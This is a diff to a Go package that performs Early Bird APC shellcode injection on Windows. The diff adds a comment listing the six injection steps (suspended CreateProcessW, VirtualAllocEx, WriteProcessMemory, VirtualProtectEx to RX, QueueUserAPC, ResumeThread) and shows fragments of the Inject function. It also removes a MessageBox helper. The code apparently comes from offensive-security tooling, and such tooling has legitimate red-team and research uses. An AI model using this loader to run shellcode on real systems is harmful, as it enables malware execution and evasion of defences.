@@ -1,3 +1,14 @@
+//ref: https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/EarlyBird/main.go
+
+/*
+This package executes shellcode in a child process using the following steps:
+ 1. Create a child proccess in a suspended state with CreateProcessW
+ 2. Allocate RW memory in the child process with VirtualAllocEx
+ 3. Write shellcode to the child process with WriteProcessMemory
+ 4. Change the memory permissions to RX with VirtualProtectEx
+ 5. Add a UserAPC call that executes the shellcode to the child process with QueueUserAPC
+ 6. Resume the suspended program with ResumeThread function
+*/
 package injection
 
 import (
@@ -8,6 +19,11 @@ import (
 	"unsafe"
 )
 
+// function to inject shellcode into a process
+// verbose and debug are used for debugging
+// program is the path to the program to inject into
+// args are the arguments to pass to the program
+// shellcode is the shellcode to inject
 func Inject(verbose bool, debug bool, program string, args string, shellcode []byte) (bool, error) {
 	// Load DLLs and Procedures
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
@@ -89,11 +105,14 @@ func Inject(verbose bool, debug bool, program string, args string, shellcode []b
 	if debug {
 		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", procInfo.ProcessId))
 	}
+
 	oldProtect := windows.PAGE_READWRITE
 	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+
 	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
 	}
+
 	if verbose {
 		fmt.Println(fmt.Sprintf("[-]Successfully changed memory permissions to PAGE_EXECUTE_READ in PID %d", procInfo.ProcessId))
 	}
@@ -144,15 +163,4 @@ func Inject(verbose bool, debug bool, program string, args string, shellcode []b
 		log.Fatal(fmt.Sprintf("[!]Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()))
 	}
 	return false, nil
-}
-
-func MessageBox(hWnd uintptr, lpText string, lpCaption string, uType uint) int {
-	user32 := windows.NewLazySystemDLL("user32.dll")
-	MessageBoxW := user32.NewProc("MessageBoxW")
-	ret, _, _ := MessageBoxW.Call(
-		uintptr(hWnd),
-		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpText))),
-		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCaption))),
-		uintptr(uType))
-	return int(ret)
 }
